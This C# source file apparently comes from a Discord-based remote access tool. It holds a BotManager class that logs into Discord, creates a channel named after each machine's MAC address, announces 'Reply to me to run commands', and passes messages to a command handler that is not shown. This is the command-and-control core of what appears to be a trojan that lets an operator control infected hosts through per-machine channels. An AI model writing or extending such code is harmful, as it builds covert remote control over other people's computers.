using System.Net.NetworkInformation;
using Diethynylbenzene.Source.Utils;
using Discord;
using Discord.WebSocket;

namespace Diethynylbenzene.Source.Core
{
	public class BotManager
	{
		Debug debug = new();
		DiscordSocketClient discordClient = new();
		CommandManager commandManager = new();

		private string botToken = "";
		private string serverId = "";

		private ulong channelId = 0;

		private string GetChannelName()
		{
			string? mac = NetworkInterface
				.GetAllNetworkInterfaces()
				.FirstOrDefault(net => net.OperationalStatus == OperationalStatus.Up &&
					net.NetworkInterfaceType != NetworkInterfaceType.Loopback)?
				.GetPhysicalAddress()
				.ToString();

			if (String.IsNullOrEmpty(mac))
				return "unknown";

			return mac.ToLower();
		}

		private async Task CreateChannelAsync()
		{
			var guild = discordClient.GetGuild(ulong.Parse(serverId));
			string channelName = GetChannelName();

			var channel = guild.TextChannels.FirstOrDefault(channel => channel.Name == channelName);
			if (channel != null)
			{
				channelId = channel.Id;
				return;
			}

			var newChannel = await guild.CreateTextChannelAsync(channelName);
			channelId = newChannel.Id;
		}

		private async Task WhenReadyAsync()
		{
			debug.Info("bot ready");

			await CreateChannelAsync();

			var channel = discordClient.GetChannel(channelId) as IMessageChannel;

			#pragma warning disable CS8602
			await channel.SendMessageAsync("\nReply to me to run commands\nUse .help for a list of commands");
			#pragma warning restore CS8602
		}

		private async Task WhenMessageReceivedAsync(SocketMessage message)
		{
			await commandManager.HandleMessageAsync(message);
		}

		public void LoadConfig(string token, string server)
		{
			botToken = token;
			serverId = server;

			debug.Trace("config loaded");
		}

		public async Task StartAsync()
		{
			debug.Wipe();
			debug.Info("bot started");

			discordClient.Ready += WhenReadyAsync;
			discordClient.MessageReceived += WhenMessageReceivedAsync;

			await discordClient.LoginAsync(TokenType.Bot, botToken);
			debug.Info("but logged in");

			await discordClient.StartAsync();
			debug.Info("bot connected");

			await Task.Delay(-1);
		}
	}
}